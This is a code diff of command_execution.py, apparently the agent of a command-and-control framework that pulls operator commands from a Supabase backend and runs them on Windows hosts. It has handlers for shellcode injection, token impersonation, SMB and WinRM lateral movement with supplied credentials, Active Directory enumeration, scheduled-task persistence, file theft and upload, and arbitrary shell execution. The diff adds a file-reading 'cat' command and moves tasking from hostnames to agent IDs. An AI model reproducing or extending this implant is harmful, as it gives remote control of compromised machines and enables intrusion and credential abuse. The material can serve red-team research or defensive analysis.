@@ -1,11 +1,9 @@
-# command_execution.py
-
 import os
 import logging
 import time
 import shlex
 from supabase import create_client
-from .commands import update_command_status, fetch_pending_commands_for_hostname
+from .commands import update_command_status, fetch_pending_commands_for_agent
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import supabase, PIPE_NAME_TEMPLATE
@@ -46,6 +44,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.create_scheduled_task import create_scheduled_task
     from utils.winapi.delete_scheduled_task import delete_scheduled_task
     from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
+    from utils.winapi.cat import cat
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -108,7 +107,7 @@ def send_command_to_smb_agent(command):
             return None, f"Failed to communicate with SMB agent: {e}"
     return None, "SMB agent is not linked."
 
-def handle_kill_command(command_id, command_text, hostname):
+def handle_kill_command(command_id, command_text, agent_id):
     if command_text.strip().lower() == "kill":
         logging.info("Kill command received. Updating status and preparing to exit agent.")
         try:
@@ -128,7 +127,7 @@ def handle_kill_command(command_id, command_text, hostname):
         try:
             response = supabase.table('settings').update({
                 'check_in': 'Dead'
-            }).eq('hostname', hostname).execute()
+            }).eq('agent_id', agent_id).execute()
 
             if response.data:
                 logging.info("Agent status updated successfully to 'Dead'.")
@@ -142,7 +141,7 @@ def handle_kill_command(command_id, command_text, hostname):
             logging.info("Shutdown sequence initiated.")
             os._exit(0)
 
-def execute_commands():
+def execute_commands(agent_id):
     hostname, ip, os_info = get_system_info()
 
     pending_uploads_response = fetch_pending_uploads()
@@ -156,7 +155,8 @@ def execute_commands():
                 else:
                     supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
-    pending_commands_response = fetch_pending_commands_for_hostname(hostname)
+    pending_commands_response = fetch_pending_commands_for_agent(agent_id)
+
     if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
@@ -165,7 +165,7 @@ def execute_commands():
             smbhost = None
 
             if command_text.lower().startswith('kill'):
-                handle_kill_command(command_id, command_text, hostname)
+                handle_kill_command(command_id, command_text, agent_id)
 
             elif command_text.lower().startswith('link smb agent'):
                 parts = command_text.split()
@@ -174,18 +174,18 @@ def execute_commands():
                 password = parts[5] if len(parts) > 5 else None
                 domain = parts[6] if len(parts) > 6 else None
                 result = link_smb_agent(ip_address, username, password, domain)
-                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
+                update_command_status(command_id, 'Completed', result, agent_id, ip, os_info, username)
 
             elif command_text.lower().startswith('unlink smb agent'):
                 parts = command_text.split()
                 ip_address = parts[3]
                 result = unlink_smb_agent(ip_address)
-                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
+                update_command_status(command_id, 'Completed', result, agent_id, ip, os_info, username)
 
             elif command_text.lower().startswith('smb '):
                 smb_command = command_text[4:]
                 smbhost, result = send_command_to_smb_agent(smb_command)
-                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username, smbhost)
+                update_command_status(command_id, 'Completed', result, agent_id, ip, os_info, username, smbhost)
 
             elif os.name == 'nt' and command_text.lower().startswith('ls'):
                 try:
@@ -196,7 +196,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'get_dc_list':
                 try:
@@ -206,7 +206,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('rm'):
                 try:
@@ -217,7 +217,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('mkdir'):
                 try:
@@ -228,7 +228,18 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('cat'):
+                try:
+                    file_path = command_text.split(' ', 1)[1]
+                    result = cat(file_path)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'get_logged_on_users':
                 try:
@@ -238,7 +249,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'get_ad_domain':
                 try:
@@ -248,7 +259,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'get_installed_programs':
                 try:
@@ -258,7 +269,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'get_drive_info':
                 try:
@@ -268,7 +279,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('make_token'):
                 try:
@@ -282,7 +293,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = f"{str(e)}"
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'revert_to_self':
                 try:
@@ -292,7 +303,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = f"{str(e)}"
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('ipinfo'):
                 try:
@@ -302,7 +313,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = f"{str(e)}"
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('cd'):
                 try:
@@ -313,7 +324,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = f"{str(e)}"
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text == "ipinfo":
                 command_text = "ipinfo"
@@ -327,8 +338,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = f"{str(e)}"
-                    logging.error(output)  # Log the error for debugging
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('injectshellcode'):
                 try:
@@ -339,7 +349,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('cp'):
                 try:
@@ -353,7 +363,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'ps':
                 try:
@@ -363,7 +373,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
                 try:
@@ -374,7 +384,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('ps term'):
                 try:
@@ -385,7 +395,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('run'):
                 try:
@@ -396,7 +406,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text.lower() == 'whoami':
                 if os.name == 'nt':
@@ -415,7 +425,7 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('mv'):
                 try:
@@ -429,7 +439,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)    
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)    
 
             elif os.name == 'nt' and command_text.lower().startswith('users '):
                 try:
@@ -437,14 +447,13 @@ def execute_commands():
                     if len(parts) < 3:
                         raise ValueError("Invalid users command format. Use 'users <local|dom> <group_name>'.")
                     group_type, group_name = parts[1], parts[2]
-                    logging.info(f"Parsed group_type: {group_type}, group_name: {group_name}")
                     result = list_users_in_group(group_type, group_name)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower() == 'list_scheduled_tasks':
                 try:
@@ -454,7 +463,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('create_scheduled_task'):
                 try:
@@ -474,7 +483,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('delete_scheduled_task'):
                 try:
@@ -488,7 +497,7 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('get_scheduled_task_info'):
                 try:
@@ -502,20 +511,20 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
 
-            elif os.name == 'nt' and command_text.lower().startswith('smb write '):
+            elif os.name == 'nt' and command_text.lower().startswith('writesmb '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
                     status = 'Failed'
-                    output = "Invalid smb write command format. Use 'smb write <local_file_path> <remote_smb_path> [username password domain]'."
+                    output = "Invalid writesmb command format. Use 'writesmb <local_file_path> <remote_smb_path> [username password domain]'."
                 else:
                     try:
-                        local_file_path = parts[2]
-                        remote_smb_path = parts[3]
-                        if len(parts) == 7:
-                            username, password, domain = parts[4], parts[5], parts[6]
+                        local_file_path = parts[1]
+                        remote_smb_path = parts[2]
+                        if len(parts) == 6:
+                            username, password, domain = parts[3], parts[4], parts[5]
                             result = smb_write(local_file_path, remote_smb_path, username, password, domain)
                         else:
                             result = smb_write(local_file_path, remote_smb_path)
@@ -524,19 +533,19 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
-            elif os.name == 'nt' and command_text.lower().startswith('smb get '):
+            elif os.name == 'nt' and command_text.lower().startswith('getsmb '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
                     status = 'Failed'
-                    output = "Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'."
+                    output = "Invalid getsmb command format. Use 'getsmb <remote_file_path> <local_file_path> [username password domain]'."
                 else:
                     try:
-                        remote_file_path = parts[2]
-                        local_file_path = parts[3]
-                        if len(parts) == 7:
-                            username, password, domain = parts[4], parts[5], parts[6]
+                        remote_file_path = parts[1]
+                        local_file_path = parts[2]
+                        if len(parts) == 6:
+                            username, password, domain = parts[3], parts[4], parts[5]
                             result = smb_get(remote_file_path, local_file_path, username, password, domain)
                         else:
                             result = smb_get(remote_file_path, local_file_path)
@@ -545,7 +554,7 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
                 parts = command_text.split(' ')
@@ -566,7 +575,7 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text.lower() == 'pwd':
                 if os.name == 'nt':
@@ -585,13 +594,13 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text.lower().startswith('download'):
-                status, output = handle_download_command(command_text, username)
+                status, output = handle_download_command(command_text, username, agent_id, hostname)
 
             elif command_text.lower().startswith('upload'):
-                status, output = handle_upload_command(command_text, username)
+                status, output = handle_upload_command(command_text, username, agent_id, hostname)
 
             elif command_text.lower().startswith("netexec "):
                 try:
@@ -603,7 +612,7 @@ def execute_commands():
                 except Exception as e:
                     status = "Failed"
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text.lower() == 'hostname':
                 if os.name == 'nt':
@@ -614,7 +623,7 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             elif command_text.lower().startswith('nslookup'):
                 if os.name == 'nt':
@@ -626,7 +635,7 @@ def execute_commands():
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
 
             else:
                 try:
@@ -636,10 +645,4 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, output, hostname, ip, os_info, username)
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    while True:
-        execute_commands()
-        time.sleep(5)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
